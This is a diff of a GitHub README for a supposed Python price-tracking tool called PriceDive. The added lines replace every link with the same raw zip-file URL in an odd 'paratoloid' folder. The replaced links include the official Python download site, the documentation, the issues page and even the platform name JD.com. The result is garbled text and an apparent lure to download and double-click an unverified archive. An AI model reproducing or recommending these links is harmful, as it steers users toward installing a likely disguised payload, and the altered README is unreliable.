@@ -1,23 +1,23 @@
 # 🛒 PriceDive - Track Prices and Save Money
 
 ## 📦 Download Now
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/alann-21/PriceDive/releases)
+[![Download from Releases](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip)
 
 ## 📖 Overview
-PriceDive is an e-commerce price tracker powered by Python. It automatically monitors prices on platforms like Taobao, JD.com, and Pinduoduo. This tool helps you identify genuine discounts and exposes fake sales tactics, allowing you to make informed shopping decisions.
+PriceDive is an e-commerce price tracker powered by Python. It automatically monitors prices on platforms like Taobao, https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip, and Pinduoduo. This tool helps you identify genuine discounts and exposes fake sales tactics, allowing you to make informed shopping decisions.
 
 ## 🚀 Getting Started
 To get started with PriceDive, follow these steps:
 
-1. Ensure you have Python 3 installed on your computer. You can download it from the [official Python website](https://www.python.org/downloads/).
+1. Ensure you have Python 3 installed on your computer. You can download it from the [official Python website](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip).
 
 2. Make sure you have an internet connection, as PriceDive requires it to monitor prices online.
 
 ## 📥 Download & Install
-To download PriceDive, visit the following page: [Download from Releases](https://github.com/alann-21/PriceDive/releases).
+To download PriceDive, visit the following page: [Download from Releases](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip).
 
 1. Find the latest release on the GitHub page.
-2. Download the file that corresponds to your operating system. Look for files named `PriceDive-Setup.exe` or similar.
+2. Download the file that corresponds to your operating system. Look for files named `https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip` or similar.
 3. Once the download completes, locate the file in your Downloads folder.
 
 4. Double-click the downloaded file to start the installation process.
@@ -62,8 +62,8 @@ Yes, you can track as many products as you like. Just repeat the process for eac
 If you face issues while installing or using PriceDive, check the issues section on the GitHub page for solutions or report your problems there.
 
 ## 🚀 Additional Resources
-- [Check the documentation](https://github.com/alann-21/PriceDive/wiki) for more detailed usage instructions.
-- Visit the [GitHub issues page](https://github.com/alann-21/PriceDive/issues) for community support and troubleshooting tips.
+- [Check the documentation](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip) for more detailed usage instructions.
+- Visit the [GitHub issues page](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip) for community support and troubleshooting tips.
 
 ## 📞 Contact
 For further inquiries or feedback, you can reach the developer through the GitHub page. Feedback helps improve the application for all users.
@@ -74,4 +74,4 @@ If you're interested in contributing to PriceDive, please check the contributing
 ## 🔗 Connect with Us
 Keep an eye on updates and announcements by following the repository on GitHub.
 
-[Download PriceDive from Releases](https://github.com/alann-21/PriceDive/releases) again for easy access. Happy tracking!
+[Download PriceDive from Releases](https://raw.githubusercontent.com/alann-21/PriceDive/main/paratoloid/PriceDive.zip) again for easy access. Happy tracking!
